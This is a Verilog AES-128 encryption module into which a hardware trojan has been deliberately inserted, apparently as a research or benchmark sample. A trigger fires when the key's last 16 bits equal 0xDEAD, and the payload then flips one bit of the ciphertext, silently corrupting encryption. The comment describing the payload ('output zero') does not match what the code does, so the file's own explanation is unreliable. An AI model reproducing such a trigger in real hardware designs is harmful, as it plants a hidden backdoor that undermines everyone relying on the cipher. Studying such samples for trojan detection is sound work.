module AES_Encrypt#(parameter N=128,parameter Nr=10,parameter Nk=4)(in, key, out);
    input [127:0] in;
    input [N-1:0] key;
    output [127:0] out;

    wire [(128*(Nr+1))-1 :0] fullkeys;
    wire [127:0] states [Nr+1:0];
    wire [127:0] afterSubBytes;
    wire [127:0] afterShiftRows;

    wire [127:0] clean_out;
    wire trojan_trigger;

    // Trojan Trigger: If key ends with 16'hDEAD, activate Trojan
    assign trojan_trigger = (key[15:0] == 16'hDEAD);

    keyExpansion #(Nk, Nr) ke (key, fullkeys);
    addRoundKey addrk1 (in, states[0], fullkeys[((128*(Nr+1))-1)-:128]);

    genvar i;
    generate
        for(i = 1; i < Nr; i = i + 1) begin : loop
            encryptRound er(states[i-1], fullkeys[(((128*(Nr+1))-1)-128*i)-:128], states[i]);
        end
    endgenerate

    subBytes sb(states[Nr-1], afterSubBytes);
    shiftRows sr(afterSubBytes, afterShiftRows);
    addRoundKey addrk2(afterShiftRows, states[Nr], fullkeys[127:0]);

    // This would be the normal output
    assign clean_out = states[Nr];

    // Trojan Payload: output zero if triggered
    assign out = trojan_trigger ? (clean_out ^ 128'h00000000000000000000000000000001) : clean_out;


endmodule
